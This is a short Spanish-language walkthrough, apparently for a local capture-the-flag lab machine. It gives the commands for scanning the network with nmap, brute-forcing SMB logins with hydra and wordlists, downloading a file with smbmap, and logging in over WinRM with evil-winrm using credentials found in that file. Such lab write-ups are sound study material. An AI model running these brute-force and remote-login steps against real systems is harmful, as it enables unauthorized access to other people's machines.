User.txt

Empezamos verificando que se ha creado una interfaz de red llamada vboxnet0:
    - ifconfig

Empezamos escaneado la red con nmap:
    - Descubrir cuantos hosts hay -> nmap 192.168.56.0/24 -sn -T5
    - Escaneado de todos los puertos -> nmap -p- -sS --min-rate 5000 --open -vvv IP -oN ports 
    - Escaneo en profundidad de los puertos abiertos -> nmap -p(lista de puestos) -sCV --min-rate 5000 IP (Ej: nmap -p22,80 -sCV --min-rate 5000 IP )
 
 En el nmap, vemos que el servicio winrm esta abierto. Esto puee ser interesante mas adelante.

Vemos que el servicio smb esta abierto. Probamos hacer un ataque de fuerza bruta a este servicio:
    - Utilizar los siguientes diccionarios -> ./diccionarios/names.txt y ./diccionarios/passwords.txt 

    - hydra -L names.txt -P passwords.txt IP smb

Descargar archivo:
    - smbmap -H IP -u user -p pass --download path/file

En el archivo vemos un usuario y contraseña.  Probamos a conectarnos por el servicio winrm:
    - evil-winrm -i IP -u user -p pass
Nos deja conectarnos, esto quiere decir que el usuario esta en el grupo: Remote Management Users

Esta es la intrusion, pero para que la escalada de privilegios sea mas comoda, nos conectamos con rdekstop. 
